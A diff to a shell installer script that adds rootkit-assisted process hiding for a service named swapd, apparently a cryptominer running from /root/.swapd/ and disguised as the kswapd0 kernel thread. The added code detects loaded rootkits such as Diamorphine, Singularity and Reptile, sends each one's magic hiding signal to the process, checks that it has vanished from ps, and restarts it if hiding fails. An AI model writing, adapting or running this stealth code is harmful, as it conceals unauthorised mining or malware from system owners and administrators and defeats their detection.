@@ -3419,22 +3419,193 @@ fi
 echo "========================================================================"
 echo ""
 
-# ==================== FINAL PROCESS HIDING (AGGRESSIVE APPROACH) ====================
-ps ax|grep swapd
-sleep 5
-kill -31 $(pgrep -f -u root config.json)
-kill -59 $(pgrep -f -u root config.json)
-kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-kill -59 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-kill -31 $(systemctl show --property MainPID --value swapd.service 2>/dev/null)
-kill -59 $(systemctl show --property MainPID --value swapd.service 2>/dev/null)
-sleep 5
-ps ax|grep swapd
+
+
+
+
+# ==================== FINAL PROCESS HIDING (INTELLIGENT DETECTION) ====================
+echo ""
+echo "=========================================="
+echo "HIDING PROCESSES (INTELLIGENT DETECTION)"
+echo "=========================================="
+echo ""
+
+# Function to detect rootkit and get correct signal
+detect_rootkit() {
+    # Check for Diamorphine
+    if lsmod | grep -q "^diamorphine"; then
+        ROOTKIT_NAME="Diamorphine"
+        HIDE_SIGNAL=31
+        echo "[✓] Detected: Diamorphine (signal -31)"
+        return 0
+    fi
+
+    # Check for Singularity
+    if lsmod | grep -q "^singularity"; then
+        ROOTKIT_NAME="Singularity"
+        HIDE_SIGNAL=59
+        echo "[✓] Detected: Singularity (signal -59)"
+        return 0
+    fi
+
+    # Check for Reptile
+    if lsmod | grep -q "^reptile"; then
+        ROOTKIT_NAME="Reptile"
+        HIDE_SIGNAL=0
+        echo "[✓] Detected: Reptile (uses reptile_cmd)"
+        return 0
+    fi
+
+    # Check for Crypto-Miner Rootkit
+    if lsmod | grep -q "^rootkit"; then
+        ROOTKIT_NAME="Crypto-RK"
+        HIDE_SIGNAL=31
+        echo "[✓] Detected: Crypto-Miner Rootkit (signal -31)"
+        return 0
+    fi
+
+    # No rootkit found
+    echo "[!] NO ROOTKIT LOADED!"
+    ROOTKIT_NAME=""
+    HIDE_SIGNAL=0
+    return 1
+}
+
+# Detect which rootkit is loaded
+detect_rootkit
+
+if [ -z "$ROOTKIT_NAME" ]; then
+    echo ""
+    echo "[!] WARNING: No rootkit detected"
+    echo "[!] Process will remain VISIBLE"
+    echo ""
+    echo "To hide manually after loading a rootkit:"
+    echo "  PID=\$(systemctl show --property MainPID --value swapd.service)"
+    echo "  kill -31 \$PID  # For Diamorphine/Crypto-RK"
+    echo "  kill -59 \$PID  # For Singularity"
+    echo ""
+else
+    echo ""
+
+    # Wait for process to fully start
+    echo "[*] Waiting 5 seconds for process to stabilize..."
+    sleep 5
+
+    # Get swapd PID
+    echo "[*] Getting swapd PID..."
+    SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
+
+    if [ -z "$SWAPD_PID" ] || [ "$SWAPD_PID" = "0" ]; then
+        SWAPD_PID=$(pgrep -f '/root/.swapd/swapd' 2>/dev/null | head -1)
+    fi
+
+    if [ -n "$SWAPD_PID" ] && [ "$SWAPD_PID" != "0" ]; then
+        echo "[✓] Found PID: $SWAPD_PID"
+        echo ""
+
+        echo "[*] Hiding process using $ROOTKIT_NAME..."
+
+        # Use ONLY the correct signal for this rootkit
+        case "$ROOTKIT_NAME" in
+            "Diamorphine"|"Crypto-RK")
+                echo "    Sending: kill -$HIDE_SIGNAL $SWAPD_PID"
+                kill -$HIDE_SIGNAL $SWAPD_PID 2>/dev/null
+                ;;
+            "Singularity")
+                echo "    Sending: kill -$HIDE_SIGNAL $SWAPD_PID"
+                kill -$HIDE_SIGNAL $SWAPD_PID 2>/dev/null
+                ;;
+            "Reptile")
+                echo "    Running: reptile_cmd hide $SWAPD_PID"
+                reptile_cmd hide $SWAPD_PID 2>/dev/null || echo "    [!] reptile_cmd not found"
+                ;;
+        esac
+
+        # Wait for rootkit to process signal
+        echo ""
+        echo "[*] Waiting 5 seconds for rootkit to process..."
+        sleep 5
+
+        # Verify hiding worked
+        echo ""
+        echo "[*] Verifying process is hidden..."
+
+        # Check service status first
+        SERVICE_STATUS=$(systemctl is-active swapd 2>/dev/null)
+
+        if [ "$SERVICE_STATUS" = "active" ]; then
+            # Service still active - good sign
+            PS_CHECK=$(ps ax | grep '/root/.swapd/swapd' | grep -v grep)
+
+            if [ -z "$PS_CHECK" ]; then
+                echo "[✓] SUCCESS! Process is HIDDEN!"
+                echo ""
+                echo "Verification:"
+                ps ax | grep swapd | grep -v grep || echo "  (only [kswapd0] kernel thread visible)"
+                echo ""
+                echo "Rootkit: $ROOTKIT_NAME"
+                echo "Signal used: -$HIDE_SIGNAL"
+            else
+                echo "[!] Process still visible:"
+                echo "$PS_CHECK"
+                echo ""
+                echo "Rootkit loaded but not hiding processes"
+                echo "May need different rootkit version for kernel $(uname -r)"
+            fi
+        else
+            echo "[!] WARNING: Service status is '$SERVICE_STATUS'"
+            echo ""
+
+            # Check if process was killed by signal
+            if systemctl status swapd 2>/dev/null | grep -q "status=$HIDE_SIGNAL"; then
+                echo "[!] CRITICAL: Signal -$HIDE_SIGNAL KILLED the process!"
+                echo ""
+                echo "This means:"
+                echo "  - $ROOTKIT_NAME is loaded but NOT working"
+                echo "  - Signal was not intercepted by rootkit"
+                echo "  - Process died instead of hiding"
+                echo ""
+                echo "Possible causes:"
+                echo "  1. Rootkit compiled for wrong kernel version"
+                echo "  2. Rootkit incompatible with kernel $(uname -r)"
+                echo ""
+                echo "Check with:"
+                echo "  dmesg | tail -30 | grep -i rootkit"
+                echo ""
+
+                # Restart service
+                echo "[*] Restarting service (without hiding)..."
+                systemctl restart swapd
+                echo "[✓] Service restarted - process VISIBLE"
+            else
+                echo "Service failed for other reason:"
+                systemctl status swapd --no-pager | head -10
+            fi
+        fi
+    else
+        echo "[!] Could not find swapd PID"
+        echo "    Service may not be running"
+    fi
+fi
 
 echo ""
 echo "=========================================="
 echo "INSTALLATION COMPLETE"
 echo "=========================================="
+echo ""
+
+if [ -n "$ROOTKIT_NAME" ]; then
+    echo "Rootkit: $ROOTKIT_NAME"
+    if [ "$HIDE_SIGNAL" != "0" ]; then
+        echo "Hide signal: kill -$HIDE_SIGNAL <PID>"
+    else
+        echo "Hide method: reptile_cmd hide <PID>"
+    fi
+    echo ""
+fi
+
+echo "Service: systemctl status swapd"
+echo "Logs: journalctl -u swapd -f"
 echo ""
 
 exit 0
